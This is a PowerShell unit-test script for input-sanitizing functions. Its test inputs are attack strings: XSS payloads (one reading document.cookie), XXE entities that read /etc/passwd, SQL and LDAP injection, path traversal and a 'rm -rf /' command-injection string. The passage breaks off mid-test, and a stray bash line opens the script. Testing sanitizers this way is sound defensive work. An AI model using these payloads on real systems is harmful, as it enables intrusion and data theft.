###############################################################
# Copyright (©) 2024-2025 David H Hoyt. All rights reserved.
###############################################################
#                 https://srd.cx
#
# Last Updated: 17-DEC-2025 1700Z by David Hoyt
#
# Intent: Try Sanitizing User Controllable Inputs
#
#
# 
#
# Comment: Sanitizing User Controllable Input 
#          - is a Moving Target
#          - needs ongoing updates
#          - needs additional unit tests
#
#
#
###############################################################
set -euo pipefail

$ErrorActionPreference = "Stop"

# Source the canonical sanitizer
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$sanitizeScript = Join-Path $scriptDir "sanitize.ps1"

if (Test-Path $sanitizeScript) {
    . $sanitizeScript
} else {
    Write-Error "ERROR: Cannot find sanitize.ps1 in $scriptDir"
    exit 1
}

Write-Host "=========================================="
Write-Host "Testing Sanitization Functions"
Write-Host "=========================================="
Write-Host ""

$script:pass = 0
$script:fail = 0

function Run-Test {
    param(
        [string]$TestName,
        [string]$TestInput,
        [string]$Expected,
        [string]$Function = "Sanitize-Line"
    )
    
    $testNum = $script:pass + $script:fail + 1
    Write-Host "Test ${testNum}: $TestName"
    $inputLine = "  Input:    " + $TestInput
    $expectedLine = "  Expected: " + $Expected
    Write-Host $inputLine
    Write-Host $expectedLine
    
    $result = switch ($Function) {
        "Sanitize-Line" { Sanitize-Line -InputString $TestInput }
        "Sanitize-Print" { Sanitize-Print -InputString $TestInput }
        "Sanitize-Ref" { Sanitize-Ref -InputString $TestInput }
        "Sanitize-Filename" { Sanitize-Filename -InputString $TestInput }
        "Escape-Html" { Escape-Html -InputString $TestInput }
        default { Sanitize-Line -InputString $TestInput }
    }
    
    $resultLine = "  Result:   " + $result
    Write-Host $resultLine
    
    if ($result -eq $Expected) {
        Write-Host "  ✅ PASS" -ForegroundColor Green
        $script:pass++
    } else {
        Write-Host "  ❌ FAIL" -ForegroundColor Red
        $script:fail++
    }
    Write-Host ""
}

# =============================================================================
# HTML Entity Escaping Tests
# =============================================================================

Run-Test -TestName "Basic XSS payload" `
    -TestInput "<script>alert('xss')</script>" `
    -Expected "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;"

Run-Test -TestName "All HTML special chars" `
    -TestInput "A&B <tag> `"quoted`" 'single'" `
    -Expected "A&amp;B &lt;tag&gt; &quot;quoted&quot; &#39;single&#39;"

Run-Test -TestName "Realistic cppcheck output" `
    -TestInput "[IccTagBasic.cpp:42]: (warning) Member variable 'IccTag::m_nReserved' is not initialized." `
    -Expected "[IccTagBasic.cpp:42]: (warning) Member variable &#39;IccTag::m_nReserved&#39; is not initialized."

Run-Test -TestName "Empty string" `
    -TestInput "" `
    -Expected ""

Run-Test -TestName "Normal text (no special chars)" `
    -TestInput "Normal text with numbers 123 and letters abc" `
    -Expected "Normal text with numbers 123 and letters abc"

# =============================================================================
# Unicode and Charset Tests
# =============================================================================

Run-Test -TestName "Unicode characters (UTF-8)" `
    -TestInput "Hello 世界 مرحبا 🌍" `
    -Expected "Hello 世界 مرحبا 🌍"

Run-Test -TestName "Unicode with HTML entities" `
    -TestInput "<div>Hello 世界 & 'test'</div>" `
    -Expected "&lt;div&gt;Hello 世界 &amp; &#39;test&#39;&lt;/div&gt;"

Run-Test -TestName "Emoji and special symbols" `
    -TestInput "✅ PASS ❌ FAIL 🔒 Security" `
    -Expected "✅ PASS ❌ FAIL 🔒 Security"

Run-Test -TestName "Mixed RTL/LTR text with entities" `
    -TestInput "English & العربية <tag>" `
    -Expected "English &amp; العربية &lt;tag&gt;"

# =============================================================================
# Control Character and Injection Tests
# =============================================================================

Run-Test -TestName "Null bytes removed" `
    -TestInput "test`0null`0byte" `
    -Expected "testnullbyte"

Run-Test -TestName "Carriage return removed" `
    -TestInput "line1`r`nline2" `
    -Expected "line1 line2"

Run-Test -TestName "Tab preserved then converted to space" `
    -TestInput "line1`tTab`nLine2" `
    -Expected "line1`tTab Line2"

Run-Test -TestName "Bell and other control chars" `
    -TestInput "test$([char]0x07)bell$([char]0x08)backspace" `
    -Expected "testbellbackspace"

# =============================================================================
# Homograph and Lookalike Attack Tests
# =============================================================================

Run-Test -TestName "Cyrillic lookalikes" `
    -TestInput "Аdmin (Cyrillic A)" `
    -Expected "Аdmin (Cyrillic A)"

Run-Test -TestName "Mathematical bold/italic (preserved)" `
    -TestInput "𝐇𝐞𝐥𝐥𝐨 𝑾𝒐𝒓𝒍𝒅" `
    -Expected "𝐇𝐞𝐥𝐥𝐨 𝑾𝒐𝒓𝒍𝒅"

# =============================================================================
# Truncation and Length Tests
# =============================================================================

Write-Host "Test $($script:pass + $script:fail + 1): Long input truncation (2000 chars)"
$longInput = "A" * 2000
$result = Sanitize-Line -InputString $longInput
$resultLen = $result.Length
Write-Host "  Input length: 2000"
Write-Host "  Result length: $resultLen"
Write-Host "  Max allowed: $script:SANITIZE_LINE_MAXLEN"
if ($resultLen -le $script:SANITIZE_LINE_MAXLEN) {
    Write-Host "  ✅ PASS (truncated correctly)" -ForegroundColor Green
    $script:pass++
} else {
    Write-Host "  ❌ FAIL (not truncated)" -ForegroundColor Red
    $script:fail++
}
Write-Host ""

# =============================================================================
# XSS and Injection Vector Tests
# =============================================================================

Run-Test -TestName "HTML event handler injection" `
    -TestInput "<img src=x onerror='alert(1)'>" `
    -Expected "&lt;img src=x onerror=&#39;alert(1)&#39;&gt;"

Run-Test -TestName "JavaScript protocol" `
    -TestInput "javascript:alert('xss')" `
    -Expected "javascript:alert(&#39;xss&#39;)"

Run-Test -TestName "Data URI with base64" `
    -TestInput "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" `
    -Expected "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="

Run-Test -TestName "SVG with script" `
    -TestInput "<svg onload=alert(1)>" `
    -Expected "&lt;svg onload=alert(1)&gt;"

Run-Test -TestName "Markdown injection attempt" `
    -TestInput "[Click me](javascript:alert('xss'))" `
    -Expected "[Click me](javascript:alert(&#39;xss&#39;))"

Run-Test -TestName "HTML comment injection" `
    -TestInput "<!-- <script>alert(1)</script> -->" `
    -Expected "&lt;!-- &lt;script&gt;alert(1)&lt;/script&gt; --&gt;"

Run-Test -TestName "CSS expression injection" `
    -TestInput "style='expression(alert(1))'" `
    -Expected "style=&#39;expression(alert(1))&#39;"

Run-Test -TestName "XML entity expansion attempt" `
    -TestInput "<!ENTITY xxe SYSTEM `"file:///etc/passwd`">" `
    -Expected "&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;"

Run-Test -TestName "CDATA section" `
    -TestInput "<![CDATA[<script>alert(1)</script>]]>" `
    -Expected "&lt;![CDATA[&lt;script&gt;alert(1)&lt;/script&gt;]]&gt;"

Run-Test -TestName "Server-side template injection" `
    -TestInput '{{7*7}} ${7*7} <%= 7*7 %>' `
    -Expected '{{7*7}} ${7*7} &lt;%= 7*7 %&gt;'

Run-Test -TestName "Path traversal in filename" `
    -TestInput "../../../etc/shadow" `
    -Expected ".._.._.._etc_shadow" `
    -Function "Sanitize-Filename"

Run-Test -TestName "Windows path traversal" `
    -TestInput "..\..\\windows\system32" `
    -Expected "..-..-windows-system32" `
    -Function "Sanitize-Filename"

Run-Test -TestName "Command injection attempt" `
    -TestInput "test; rm -rf / #" `
    -Expected "test; rm -rf / #"

Run-Test -TestName "SQL injection pattern" `
    -TestInput "' OR '1'='1" `
    -Expected "&#39; OR &#39;1&#39;=&#39;1"

Run-Test -TestName "LDAP injection pattern" `
    -TestInput "*()|&" `
    -Expected "*()|&amp;"

# =============================================================================
# Additional XSS Signatures from Commodity-Injection-Signatures
# =============================================================================

Run-Test -TestName "HTMX XSS payload" `
    -TestInput "<img src=x hx-on:htmx:load='alert(0)' />" `
    -Expected "&lt;img src=x hx-on:htmx:load=&#39;alert(0)&#39; /&gt;"

Run-Test -TestName "SVG use/set XSS" `
    -TestInput "<svg><use><set atrributeName=`"href`" to=`"data:image/svg+xml`" />" `
    -Expected "&lt;svg&gt;&lt;use&gt;&lt;set atrributeName=&quot;href&quot; to=&quot;data:image/svg+xml&quot; /&gt;"

Run-Test -TestName "JavaScript template literal" `
    -TestInput "void''??globalThis?.alert?.(...[0b1_0_1_0_0_1_1_1_0_0_1,],)" `
    -Expected "void&#39;&#39;??globalThis?.alert?.(...[0b1_0_1_0_0_1_1_1_0_0_1,],)"

Run-Test -TestName "IE conditional comment XSS" `
    -TestInput "<!-- Hello -- world > <SCRIPT>confirm(1)</SCRIPT> -->" `
    -Expected "&lt;!-- Hello -- world &gt; &lt;SCRIPT&gt;confirm(1)&lt;/SCRIPT&gt; --&gt;"

Run-Test -TestName "Markdown image XSS" `
    -TestInput "![a](javascript:prompt(document.cookie))\\" `
    -Expected "![a](javascript:prompt(document.cookie))\\"

Run-Test -TestName "Unicode mathematical alphanumerics" `
    -TestInput "𒀀='',𒉺=!𒀀+𒀀" `
    -Expected "𒀀=&#39;&#39;,𒉺=!𒀀+𒀀"

Run-Test -TestName "Optional chaining XSS" `
    -TestInput "alert?.(document?.cookie)" `
    -Expected "alert?.(document?.cookie)"

Run-Test -TestName "Async function constructor" `
    -TestInput "(async function(){}).constructor('alert(1)')();" `
    -Expected "(async function(){}).constructor(&#39;alert(1)&#39;)();"

Run-Test -TestName "XML processing instruction" `
    -TestInput "<?xml-stylesheet href=`"javascript:alert(1)`"?>" `
    -Expected "&lt;?xml-stylesheet href=&quot;javascript:alert(1)&quot;?&gt;"

Run-Test -TestName "SVG foreignObject XSS" `
    -TestInput "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>" `
    -Expected "&lt;svg&gt;&lt;foreignObject&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/foreignObject&gt;&lt;/svg&gt;"

Run-Test -TestName "Base href XSS" `
    -TestInput "<base href=`"javascript:\\`">" `
    -Expected "&lt;base href=&quot;javascript:\\&quot;&gt;"

Run-Test -TestName "Meta refresh XSS" `
    -TestInput "<META HTTP-EQUIV=`"refresh`" CONTENT=`"0;url=javascript:confirm(1);`">" `
    -Expected "&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:confirm(1);&quot;&gt;"

Run-Test -TestName "Object classid XSS" `
    -TestInput "<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>" `
    -Expected "&lt;object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;"

Run-Test -TestName "Form action XSS" `
    -TestInput "<form action=javascript:alert(1)><input type=submit>" `
    -Expected "&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;"

Run-Test -TestName "Details ontoggle XSS" `
    -TestInput "<details open ontoggle=alert(1)>" `
    -Expected "&lt;details open ontoggle=alert(1)&gt;"

Run-Test -TestName "Marquee onstart XSS" `
    -TestInput "<marquee onstart=confirm(2)>" `
    -Expected "&lt;marquee onstart=confirm(2)&gt;"

Run-Test -TestName "Input autofocus XSS" `
    -TestInput "<input autofocus onfocus=alert(1)>" `
    -Expected "&lt;input autofocus onfocus=alert(1)&gt;"

Run-Test -TestName "Link rel import XSS" `
    -TestInput "<link rel=import href=`"data:text/html,<script>alert(1)</script>`">" `
    -Expected "&lt;link rel=import href=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;"

Run-Test -TestName "ES6 template string XSS" `
    -TestInput "<script>alert\u0060 1\u0060</script>" `
    -Expected "&lt;script&gt;alert\u0060 1\u0060&lt;/script&gt;"

# =============================================================================
# JavaScript Injection Signatures (from javascript/*.txt files)
# =============================================================================

# Event handlers
Run-Test -TestName "Event handler: onload" `
    -TestInput "<body onload=alert(1)>" `
    -Expected "&lt;body onload=alert(1)&gt;"

Run-Test -TestName "Event handler: onerror" `
    -TestInput "<img src=x onerror=alert(1)>" `
    -Expected "&lt;img src=x onerror=alert(1)&gt;"

Run-Test -TestName "Event handler: onfocus" `
    -TestInput "<input autofocus onfocus=alert(1)>" `
    -Expected "&lt;input autofocus onfocus=alert(1)&gt;"

# Array methods
Run-Test -TestName "Array.map XSS" `
    -TestInput "[1].map(alert)" `
    -Expected "[1].map(alert)"

Run-Test -TestName "Array.find XSS" `
    -TestInput "[1].find(alert)" `
    -Expected "[1].find(alert)"

Run-Test -TestName "Array.filter XSS" `
    -TestInput "[1].filter(alert)" `
    -Expected "[1].filter(alert)"

# JavaScript protocol variations
Run-Test -TestName "JavaScript protocol basic" `
    -TestInput "javascript:alert(1)" `
    -Expected "javascript:alert(1)"

Run-Test -TestName "JavaScript protocol with unicode" `
    -TestInput "javascript:\u0061lert(1)" `
    -Expected "javascript:\u0061lert(1)"

Run-Test -TestName "JavaScript protocol encoded" `
    -TestInput "javascript&#00058;confirm(1)" `
    -Expected "javascript&amp;#00058;confirm(1)"

Run-Test -TestName "VBScript protocol" `
    -TestInput "vbscript:confirm(1);" `
    -Expected "vbscript:confirm(1);"

# String.fromCharCode patterns
Run-Test -TestName "String.fromCharCode XSS" `
    -TestInput "String.fromCharCode(97,108,101,114,116,40,39,104,105,39,41)" `
    -Expected "String.fromCharCode(97,108,101,114,116,40,39,104,105,39,41)"

Run-Test -TestName "eval with fromCharCode" `
    -TestInput "eval(String.fromCharCode(88,83,83))" `
    -Expected "eval(String.fromCharCode(88,83,83))"

# Template literals and ES6
Run-Test -TestName "Template literal alert" `
    -TestInput "alert\u0060 1\u0060" `
    -Expected "alert\u0060 1\u0060"

Run-Test -TestName "Async function XSS" `
    -TestInput "(async function(){}).constructor('alert(1)')();" `
    -Expected "(async function(){}).constructor(&#39;alert(1)&#39;)();"

Run-Test -TestName "Arrow function XSS" `
    -TestInput "f=(x=alert(1))=>{};" `
    -Expected "f=(x=alert(1))=&gt;{};"

# Constructor patterns
Run-Test -TestName "Constructor XSS pattern 1" `
    -TestInput "(0)['constructor']['constructor'](`"\u0061\u006c\u0065\u0072\u0074(1)`")();" `
    -Expected "(0)[&#39;constructor&#39;][&#39;constructor&#39;](`&quot;\u0061\u006c\u0065\u0072\u0074(1)`&quot;)();"

Run-Test -TestName "Function constructor" `
    -TestInput "Function('alert(1)')()" `
    -Expected "Function(&#39;alert(1)&#39;)()"

# Data URIs
Run-Test -TestName "Data URI base64 XSS" `
    -TestInput "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" `
    -Expected "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="

Run-Test -TestName "Data URI HTML context" `
    -TestInput "data:text/html,<script>confirm(0);</script>" `
    -Expected "data:text/html,&lt;script&gt;confirm(0);&lt;/script&gt;"

# Eval patterns
Run-Test -TestName "eval with location.hash" `
    -TestInput "eval(location.hash.slice(1))" `
    -Expected "eval(location.hash.slice(1))"

Run-Test -TestName "eval with atob" `
    -TestInput "eval(atob('amF2YXNjcmlwdDphbGVydCgxKQ'))" `
    -Expected "eval(atob(&#39;amF2YXNjcmlwdDphbGVydCgxKQ&#39;))"

Run-Test -TestName "setTimeout XSS" `
    -TestInput "setTimeout('alert(1)',1)" `
    -Expected "setTimeout(&#39;alert(1)&#39;,1)"

Run-Test -TestName "setInterval XSS" `
    -TestInput "setInterval\u0060alert(1)\u0060" `
    -Expected "setInterval\u0060alert(1)\u0060"

# Polyglot patterns
Run-Test -TestName "Polyglot HTML context 1" `
    -TestInput "jaVasCript:/*-/*\u0060/*\\\u0060/*'/*`"/**/(/* */oNcliCk=alert())" `
    -Expected "jaVasCript:/*-/*\u0060/*\\\u0060/*&#39;/*&quot;/**/(/* */oNcliCk=alert())"

Run-Test -TestName "Polyglot button onclick" `
    -TestInput "`" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//" `
    -Expected "&quot; onclick=alert(1)//&lt;button &#39; onclick=alert(1)//&gt; */ alert(1)//"

Run-Test -TestName "Polyglot script breakout" `
    -TestInput "javascript://--></script></title></style>`"/</textarea><a' onclick=alert()//>*/alert()/*" `
    -Expected "javascript://--&gt;&lt;/script&gt;&lt;/title&gt;&lt;/style&gt;&quot;/&lt;/textarea&gt;&lt;a&#39; onclick=alert()//&gt;*/alert()/*"

# Object prototype manipulation
Run-Test -TestName "Object.defineProperty XSS" `
    -TestInput "Object.defineProperty(window,'location',{value:'javascript:alert(1)'})" `
    -Expected "Object.defineProperty(window,&#39;location&#39;,{value:&#39;javascript:alert(1)&#39;})"

Run-Test -TestName "Symbol.toStringTag XSS" `
    -TestInput "Object.prototype[Symbol.toStringTag]='<svg/onload=alert(1)>'" `
    -Expected "Object.prototype[Symbol.toStringTag]=&#39;&lt;svg/onload=alert(1)&gt;&#39;"

# Throw/onerror patterns
Run-Test -TestName "onerror throw XSS" `
    -TestInput "onerror=alert;throw 1;" `
    -Expected "onerror=alert;throw 1;"

Run-Test -TestName "onerror eval throw" `
    -TestInput "onerror=eval;throw'=alert\\x281\\x29';" `
    -Expected "onerror=eval;throw&#39;=alert\\x281\\x29&#39;;"

# Location manipulations
Run-Test -TestName "location assignment XSS" `
    -TestInput "location='javascript:alert(1)'" `
    -Expected "location=&#39;javascript:alert(1)&#39;"

Run-Test -TestName "location.href XSS" `
    -TestInput "location.href\u0060javascript:alert(1)\u0060" `
    -Expected "location.href\u0060javascript:alert(1)\u0060"

# Document methods
Run-Test -TestName "document.write XSS" `
    -TestInput "document.write('<script>alert(1)</script>')" `
    -Expected "document.write(&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;)"

Run-Test -TestName "document.cookie access" `
    -TestInput "`"+document.cookie+`"" `
    -Expected "&quot;+document.cookie+&quot;"

# Edge cases and obfuscation
Run-Test -TestName "Octal escape XSS" `
    -TestInput "eval('\\141\\154\\145\\162\\164(1)')" `
    -Expected "eval(&#39;\\141\\154\\145\\162\\164(1)&#39;)"

Run-Test -TestName "Hex escape XSS" `
    -TestInput "eval('\\x61\\x6c\\x65\\x72\\x74(1)')" `
    -Expected "eval(&#39;\\x61\\x6c\\x65\\x72\\x74(1)&#39;)"

Run-Test -TestName "Unicode escape XSS" `
    -TestInput "\\u0061\\u006c\\u0065\\u0072\\u0074(1)" `
    -Expected "\\u0061\\u006c\\u0065\\u0072\\u0074(1)"

Run-Test -TestName "Top window access" `
    -TestInput "top['al'+'ert'](1)" `
    -Expected "top[&#39;al&#39;+&#39;ert&#39;](1)"

Run-Test -TestName "ParseInt XSS" `
    -TestInput "parseInt(`"alert`",30)" `
    -Expected "parseInt(&quot;alert&quot;,30)"

Run-Test -TestName "ToString radix XSS" `
    -TestInput "8680439..toString(30)" `
    -Expected "8680439..toString(30)"

# =============================================================================
# SVG Injection Signatures (from svg/*.svg and svg/*.txt files)
# =============================================================================

# Basic SVG onload patterns
Run-Test -TestName "SVG onload basic" `
    -TestInput '<svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>' `
    -Expected '&lt;svg onload=&quot;alert(1)&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;/svg&gt;'

Run-Test -TestName "SVG font DOCTYPE with onload" `
    -TestInput '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"><defs><font id="x"><font-face font-family="y"/></font></defs></svg>' `
    -Expected '&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;&lt;svg onload=&quot;alert(1)&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;defs&gt;&lt;font id=&quot;x&quot;&gt;&lt;font-face font-family=&quot;y&quot;/&gt;&lt;/font&gt;&lt;/defs&gt;&lt;/svg&gt;'

Run-Test -TestName "SVG handler with xml-events" `
    -TestInput '<svg xmlns="http://www.w3.org/2000/svg"><onload=confirm(1)> xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>' `
    -Expected '&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;onload=confirm(1)&gt; xmlns:ev=&quot;http://www.w3.org/2001/xml-events&quot; ev:event=&quot;load&quot;&gt;alert(1)&lt;/handler&gt;&lt;/svg&gt;'

# SVG with xlink:href
Run-Test -TestName "SVG image xlink injection" `
    -TestInput '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="javascript:alert(1)"/></svg>' `
    -Expected '&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;&gt;&lt;image xlink:href=&quot;javascript:alert(1)&quot;/&gt;&lt;/svg&gt;'

Run-Test -TestName "SVG image with command injection" `
    -TestInput '<image xlink:href="https://xss.cx/xss.svg?4&quot;|ls%20&quot;-la"/>' `
    -Expected '&lt;image xlink:href=&quot;https://xss.cx/xss.svg?4&amp;quot;|ls%20&amp;quot;-la&quot;/&gt;'

# SVG animate patterns
Run-Test -TestName "SVG animate attributeName" `
    -TestInput '<svg><animate attributeName="onload" to="alert(1)"/></svg>' `
    -Expected '&lt;svg&gt;&lt;animate attributeName=&quot;onload&quot; to=&quot;alert(1)&quot;/&gt;&lt;/svg&gt;'

Run-Test -TestName "SVG set attributeName XSS" `
    -TestInput '<svg><set attributeName="onmouseover" to="alert(1)"/></svg>' `
    -Expected '&lt;svg&gt;&lt;set attributeName=&quot;onmouseover&quot; to=&quot;alert(1)&quot;/&gt;&lt;/svg&gt;'

# SVG script tags
Run-Test -TestName "SVG script basic" `
    -TestInput '<svg><script>alert(1)</script></svg>' `
    -Expected '&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;'

Run-Test -TestName "SVG script with xlink" `
    -TestInput '<svg><script xlink:href="data:,alert(1)"/></svg>' `
    -Expected '&lt;svg&gt;&lt;script xlink:href=&quot;data:,alert(1)&quot;/&gt;&lt;/svg&gt;'

Run-Test -TestName "SVG script with href" `
    -TestInput '<svg><script href="javascript:alert(1)"/></svg>' `
    -Expected '&lt;svg&gt;&lt;script href=&quot;javascript:alert(1)&quot;/&gt;&lt;/svg&gt;'

# SVG foreignObject
Run-Test -TestName "SVG foreignObject with HTML" `
    -TestInput '<svg><foreignObject><body onload="alert(1)"/></foreignObject></svg>' `
    -Expected '&lt;svg&gt;&lt;foreignObject&gt;&lt;body onload=&quot;alert(1)&quot;/&gt;&lt;/foreignObject&gt;&lt;/svg&gt;'

Run-Test -TestName "SVG foreignObject xlink" `
    -TestInput '<svg><foreignObject xlink:href="javascript:alert(1)"/></svg>' `
    -Expected '&lt;svg&gt;&lt;foreignObject xlink:href=&quot;javascript:alert(1)&quot;/&gt;&lt;/svg&gt;'

# SVG use element
Run-Test -TestName "SVG use xlink:href" `
    -TestInput '<svg><use xlink:href="data:image/svg+xml,<svg onload=alert(1)>"/></svg>' `
    -Expected '&lt;svg&gt;&lt;use xlink:href=&quot;data:image/svg+xml,&lt;svg onload=alert(1)&gt;&quot;/&gt;&lt;/svg&gt;'

Run-Test -TestName "SVG use with set" `
    -TestInput '<svg><use><set attributeName="xlink:href" to="data:text/html,<script>alert(1)</script>"/></use></svg>' `
    -Expected '&lt;svg&gt;&lt;use&gt;&lt;set attributeName=&quot;xlink:href&quot; to=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;/&gt;&lt;/use&gt;&lt;/svg&gt;'

# SVG style injection
Run-Test -TestName "SVG style with background" `
    -TestInput '<svg><style>*{background:url("javascript:alert(1)")}</style></svg>' `
    -Expected '&lt;svg&gt;&lt;style&gt;*{background:url(&quot;javascript:alert(1)&quot;)}&lt;/style&gt;&lt;/svg&gt;'

Run-Test -TestName "SVG style -o-link" `
    -TestInput '<svg><style>{-o-link:&#39;javascript:alert(1)&#39;}</style></svg>' `
    -Expected '&lt;svg&gt;&lt;style&gt;{-o-link:&amp;#39;javascript:alert(1)&amp;#39;}&lt;/style&gt;&lt;/svg&gt;'

# SVG event handlers
Run-Test -TestName "SVG onclick handler" `
    -TestInput '<svg onclick="alert(1)"><circle r="100"/></svg>' `
    -Expected '&lt;svg onclick=&quot;alert(1)&quot;&gt;&lt;circle r=&quot;100&quot;/&gt;&lt;/svg&gt;'

Run-Test -TestName "SVG onmouseover handler" `
    -TestInput '<svg onmouseover="alert(1)"><rect width="100"/></svg>' `
    -Expected '&lt;svg onmouseover=&quot;alert(1)&quot;&gt;&lt;rect width=&quot;100&quot;/&gt;&lt;/svg&gt;'

Run-Test -TestName "SVG onerror in image" `
    -TestInput '<svg><image href="x" onerror="alert(1)"/></svg>' `
    -Expected '&lt;svg&gt;&lt;image href=&quot;x&quot; onerror=&quot;alert(1)&quot;/&gt;&lt;/svg&gt;'

# SVG with data URIs
Run-Test -TestName "SVG data URI base64" `
    -TestInput '<svg><image href="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"/></svg>' `
    -Expected '&lt;svg&gt;&lt;image href=&quot;data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+&quot;/&gt;&lt;/svg&gt;'

Run-Test -TestName "SVG data URI text/html" `
    -TestInput '<svg><image href="data:text/html,<script>alert(1)</script>"/></svg>' `
    -Expected '&lt;svg&gt;&lt;image href=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;/&gt;&lt;/svg&gt;'

# Math/SVG polyglot
Run-Test -TestName "Math style SVG img injection" `
    -TestInput '<math></p><style><!--</style><img src/onerror=alert(1)>' `
    -Expected '&lt;math&gt;&lt;/p&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;img src/onerror=alert(1)&gt;'

Run-Test -TestName "Form math mtext SVG polyglot" `
    -TestInput '<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">' `
    -Expected '&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;style&gt;&lt;path id=&quot;&lt;/style&gt;&lt;img onerror=alert(1) src&gt;&quot;&gt;'

# SVG feImage
Run-Test -TestName "SVG feImage with set" `
    -TestInput '<svg><feImage><set attributeName="xlink:href" to="data:image/svg+xml,<svg onload=alert(1)>"/></feImage></svg>' `
    -Expected '&lt;svg&gt;&lt;feImage&gt;&lt;set attributeName=&quot;xlink:href&quot; to=&quot;data:image/svg+xml,&lt;svg onload=alert(1)&gt;&quot;/&gt;&lt;/feImage&gt;&lt;/svg&gt;'

# SVG a element
Run-Test -TestName "SVG anchor xlink" `
    -TestInput '<svg><a xlink:href="javascript:alert(1)"><text>Click</text></a></svg>' `
    -Expected '&lt;svg&gt;&lt;a xlink:href=&quot;javascript:alert(1)&quot;&gt;&lt;text&gt;Click&lt;/text&gt;&lt;/a&gt;&lt;/svg&gt;'

Run-Test -TestName "SVG anchor with rect" `
    -TestInput '<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="100"/></a></svg>' `
    -Expected '&lt;svg&gt;&lt;a xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; xlink:href=&quot;javascript:alert(1)&quot;&gt;&lt;rect width=&quot;100&quot;/&gt;&lt;/a&gt;&lt;/svg&gt;'

# SVG discard
Run-Test -TestName "SVG discard element" `
    -TestInput '<svg><discard onbegin="alert(1)"/></svg>' `
    -Expected '&lt;svg&gt;&lt;discard onbegin=&quot;alert(1)&quot;/&gt;&lt;/svg&gt;'

# SVG handler element
Run-Test -TestName "SVG handler element" `
    -TestInput '<svg xmlns="http://www.w3.org/2000/svg"><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>' `
    -Expected '&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;handler xmlns:ev=&quot;http://www.w3.org/2001/xml-events&quot; ev:event=&quot;load&quot;&gt;alert(1)&lt;/handler&gt;&lt;/svg&gt;'

# SVG title/desc XSS
Run-Test -TestName "SVG title with script" `
    -TestInput '<svg><title><script>alert(1)</script></title></svg>' `
    -Expected '&lt;svg&gt;&lt;title&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/title&gt;&lt;/svg&gt;'

Run-Test -TestName "SVG desc with onload" `
    -TestInput '<svg><desc onload="alert(1)">Description</desc></svg>' `
    -Expected '&lt;svg&gt;&lt;desc onload=&quot;alert(1)&quot;&gt;Description&lt;/desc&gt;&lt;/svg&gt;'

# =============================================================================
# XML Injection Signatures (from xml/*.txt files)
# =============================================================================

# XML External Entity (XXE) attacks
Run-Test -TestName "XXE file:///etc/passwd" `
    -TestInput '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>' `
    -Expected '&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;'

Run-Test -TestName "XXE file:///c:/boot.ini" `
    -TestInput '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]>' `
    -Expected '&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///c:/boot.ini&quot;&gt;]&gt;'

Run-Test -TestName "XXE SSRF localhost" `
    -TestInput '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><foo>&xxe;</foo>' `
